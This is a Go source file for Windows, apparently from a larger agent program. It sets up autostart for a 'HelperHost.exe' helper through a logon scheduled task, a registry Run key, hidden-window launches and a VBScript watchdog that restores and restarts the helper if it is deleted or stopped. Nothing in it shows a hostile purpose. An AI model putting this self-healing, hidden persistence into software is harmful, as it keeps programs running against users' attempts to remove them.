//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func hideWindow(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

func installAutostart() string {
	vbs := filepath.Join(dir, "reconnect.vbs")
	watchVbs := filepath.Join(dir, "watchdog.vbs")
	dirWin := dir
	helperWin := helperPath
	watchWin := watchVbs
	cacheWin := cacheDir
	hn := helperFileName()

	watch := "Set sh = CreateObject(\"WScript.Shell\")\r\n"
	watch += fmt.Sprintf("sh.CurrentDirectory = %q\r\n", dirWin)
	watch += "Do\r\n"
	watch += fmt.Sprintf("  If Not CreateObject(\"Scripting.FileSystemObject\").FileExists(%q) Then\r\n", helperWin)
	watch += fmt.Sprintf("    If CreateObject(\"Scripting.FileSystemObject\").FileExists(%q) Then\r\n", filepath.Join(cacheWin, hn))
	watch += fmt.Sprintf("      CreateObject(\"Scripting.FileSystemObject\").CopyFile %q, %q, True\r\n", filepath.Join(cacheWin, hn), helperWin)
	watch += "    End If\r\n  End If\r\n"
	watch += "  Set wmi = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\r\n"
	watch += "  Set procs = wmi.ExecQuery(\"Select * from Win32_Process Where Name = 'HelperHost.exe'\")\r\n"
	watch += "  If procs.Count = 0 Then\r\n"
	watch += fmt.Sprintf("    sh.Run \"\"\"%s\"\"\", 0, False\r\n", helperWin)
	watch += "  End If\r\n  WScript.Sleep 20000\r\nLoop\r\n"
	_ = os.WriteFile(watchVbs, []byte(watch), 0o644)

	rec := "Set sh = CreateObject(\"WScript.Shell\")\r\n"
	rec += fmt.Sprintf("sh.CurrentDirectory = %q\r\n", dirWin)
	rec += "Dim i\r\nFor i = 1 To 90\r\n"
	rec += "  rc = sh.Run(\"ping -n 1 -w 2000 1.1.1.1\", 0, True)\r\n"
	rec += "  If rc = 0 Then Exit For\r\n  WScript.Sleep 2000\r\nNext\r\n"
	rec += fmt.Sprintf("sh.Run \"wscript.exe //B //Nologo \"\"%s\"\"\", 0, False\r\n", watchWin)
	rec += fmt.Sprintf("sh.Run \"\"\"%s\"\"\", 0, False\r\n", helperWin)
	_ = os.WriteFile(vbs, []byte(rec), 0o644)

	tr := fmt.Sprintf("wscript.exe //B //Nologo \"%s\"", vbs)
	methods := []string{}
	_ = exec.Command("schtasks", "/Delete", "/TN", "HelperHost", "/F").Run()
	r := exec.Command("schtasks", "/Create", "/TN", "HelperHost", "/TR", tr, "/SC", "ONLOGON", "/DELAY", "0001:00", "/RL", "LIMITED", "/F")
	if r.Run() == nil {
		methods = append(methods, "task")
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.SetStringValue("HelperHost", tr)
		_ = key.Close()
		methods = append(methods, "run")
	}
	if len(methods) == 0 {
		return "ok"
	}
	out := methods[0]
	for i := 1; i < len(methods); i++ {
		out += "," + methods[i]
	}
	return out
}

func removeAutostart() {
	for _, tn := range []string{
		"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot",
		"HelperHostWipeRestore", "AgentShePC",
	} {
		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.DeleteValue("HelperHost")
		_ = key.DeleteValue("AgentShePC")
		_ = key.Close()
	}
}
